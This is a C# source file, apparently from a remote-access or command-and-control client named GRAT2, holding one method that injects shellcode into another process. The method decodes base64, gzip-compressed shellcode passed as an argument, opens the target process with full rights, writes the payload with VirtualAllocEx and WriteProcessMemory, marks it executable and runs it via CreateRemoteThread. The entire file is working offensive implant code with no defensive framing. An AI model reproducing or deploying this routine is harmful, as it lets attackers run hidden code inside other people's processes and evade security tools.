using System;
using System.Runtime.InteropServices;
using GRAT2_Client.PInvoke;

namespace GRAT2_Client.Injectious
{
    class CreateRemThread
    {
        public static string InjectCreateRemThread(string[] arguments)
        {
            byte[] buffer = DecGzip.DecompressGzipped(Convert.FromBase64String(arguments[1]));
            int targetId = Int32.Parse(arguments[2]);
            uint oldProtect = 0;

            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);
            IntPtr pinnedBuffer = handle.AddrOfPinnedObject();

            try
            {

                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                IntPtr lpThreadId = IntPtr.Zero;


                IntPtr procHandle = Interop.OpenProcess((uint)flags.ProcessAccessRights.All, false, (uint)targetId);
                IntPtr remoteAddr = Interop.VirtualAllocEx(procHandle, IntPtr.Zero, buffer.Length, (uint)flags.MemAllocation.MEM_COMMIT, (uint)flags.MemProtect.PAGE_READWRITE);
                if (Interop.WriteProcessMemory(procHandle, remoteAddr, pinnedBuffer, buffer.Length, out lpNumberOfBytesWritten))
                {
                   Interop.VirtualProtectEx(procHandle, remoteAddr, buffer.Length, (uint)flags.MemProtect.PAGE_EXECUTE_READ, out oldProtect);
                   Interop.CreateRemoteThread(procHandle, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, out lpThreadId);
                   handle.Free();
                }
                else
                {
                    return "Failed to inject shellcode!";
                }

            }
            catch (Exception ex)
            {
                return ex.Message;
            }

            return null;

        }
    }
}
